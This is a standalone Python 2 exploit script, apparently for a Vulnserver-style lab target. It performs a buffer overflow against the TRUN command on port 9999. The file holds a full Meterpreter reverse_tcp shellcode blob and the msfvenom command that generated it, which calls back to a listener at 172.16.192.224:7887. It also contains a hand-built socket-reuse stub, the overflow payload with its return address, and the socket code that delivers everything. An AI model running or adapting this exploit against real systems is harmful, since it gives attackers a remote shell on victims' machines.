#!/usr/bin/python
import socket
from struct import pack
from time import sleep

host = '172.16.192.168'
port = 9999
max_size = 5000

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.192.224 LPORT=7887 
# -b "\x00\x21" -a x86 --platform windows -f py -v shellcode
shellcode =  ""
shellcode += "\xba\xbe\x7a\x55\x7d\xd9\xcf\xd9\x74\x24\xf4\x5b"
shellcode += "\x2b\xc9\xb1\x56\x31\x53\x13\x03\x53\x13\x83\xeb"
shellcode += "\x42\x98\xa0\x81\x52\xdf\x4b\x7a\xa2\x80\xc2\x9f"
shellcode += "\x93\x80\xb1\xd4\x83\x30\xb1\xb9\x2f\xba\x97\x29"
shellcode += "\xa4\xce\x3f\x5d\x0d\x64\x66\x50\x8e\xd5\x5a\xf3"
shellcode += "\x0c\x24\x8f\xd3\x2d\xe7\xc2\x12\x6a\x1a\x2e\x46"
shellcode += "\x23\x50\x9d\x77\x40\x2c\x1e\xf3\x1a\xa0\x26\xe0"
shellcode += "\xea\xc3\x07\xb7\x61\x9a\x87\x39\xa6\x96\x81\x21"
shellcode += "\xab\x93\x58\xd9\x1f\x6f\x5b\x0b\x6e\x90\xf0\x72"
shellcode += "\x5f\x63\x08\xb2\x67\x9c\x7f\xca\x94\x21\x78\x09"
shellcode += "\xe7\xfd\x0d\x8a\x4f\x75\xb5\x76\x6e\x5a\x20\xfc"
shellcode += "\x7c\x17\x26\x5a\x60\xa6\xeb\xd0\x9c\x23\x0a\x37"
shellcode += "\x15\x77\x29\x93\x7e\x23\x50\x82\xda\x82\x6d\xd4"
shellcode += "\x85\x7b\xc8\x9e\x2b\x6f\x61\xfd\x23\x5c\x48\xfe"
shellcode += "\xb3\xca\xdb\x8d\x81\x55\x70\x1a\xa9\x1e\x5e\xdd"
shellcode += "\xb8\x09\x61\x31\x02\x59\x9f\xb2\x72\x73\x64\xe6"
shellcode += "\x22\xeb\x4d\x87\xa9\xeb\x72\x52\x47\xe6\xe4\xf1"
shellcode += "\x87\x36\x11\x61\xa5\xb6\xc4\xbd\x20\x50\xa8\x11"
shellcode += "\x62\xcd\x09\xc2\xc2\xbd\xe1\x08\xcd\xe2\x12\x33"
shellcode += "\x04\x8b\xb9\xdc\xf0\xe3\x55\x44\x59\x7f\xc7\x89"
shellcode += "\x74\x05\xc7\x02\x7c\xf9\x86\xe2\xf5\xe9\xff\x94"
shellcode += "\xf5\xf1\xff\x30\xf5\x9b\xfb\x92\xa2\x33\x06\xc2"
shellcode += "\x84\x9b\xf9\x21\x97\xdc\x06\xb4\xa1\x97\x31\x22"
shellcode += "\x8d\xcf\x3d\xa2\x0d\x10\x68\xa8\x0d\x78\xcc\x88"
shellcode += "\x5e\x9d\x13\x05\xf3\x0e\x86\xa6\xa5\xe3\x01\xcf"
shellcode += "\x4b\xdd\x66\x50\xb4\x08\xf5\x97\x4a\xce\xd2\x3f"
shellcode += "\x22\x30\x63\xc0\xb2\x5a\x63\x90\xda\x91\x4c\x1f"
shellcode += "\x2a\x59\x47\x48\x22\xd0\x06\x3a\xd3\xe5\x02\x9a"
shellcode += "\x4d\xe5\xa1\x07\x7e\x9c\xca\xb8\x7f\x61\xc3\xdc"
shellcode += "\x80\x61\xeb\xe2\xbd\xb7\xd2\x90\x80\x0b\x61\xaa"
shellcode += "\xb7\x2e\xc0\x21\xb7\x7d\x12\x60"

exploit = "\x83\xEC\x30" 				# SUB ESP, 30
exploit += "\x52" 						# PUSH ESP
exploit += "\xB6\x02" 					# MOV DH, 2

exploit += "\x52"  						# PUSH EDX
exploit += "\x54"  						# PUSH ESP
exploit += "\x5A"  						# POP EDX
exploit += "\x83\xC2\x60"  				# ADD EDX,60
exploit += "\x52"  						# PUSH EDX

exploit += "\xBA\x44\x94\xFB\xB7" 		# MOV EDX,B7FB9844
exploit += "\xC1\xEA\x08" 				# SHR EDX,8
exploit += "\xFF\x32" 					# PUSH EDX

exploit += "\xBA\x33\x2C\x25\x40"		# SOCKET ADDR
exploit += "\xC1\xEA\x08" 				# SHR EDX, 8
exploit += "\xFF\xD2"  # PUSH EDX

payload  = "A" * 2003
payload += pack("<L", 0x625011af)
payload += exploit
payload += "A" * (42 - len(exploit))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print "[*] Sending payload of size: {0} chars...".format(len(payload))
s.send("TRUN /.:/" + payload + "\r\n")
sleep(1)
s.send(shellcode + "A" * (512 -len(shellcode)))
s.close()
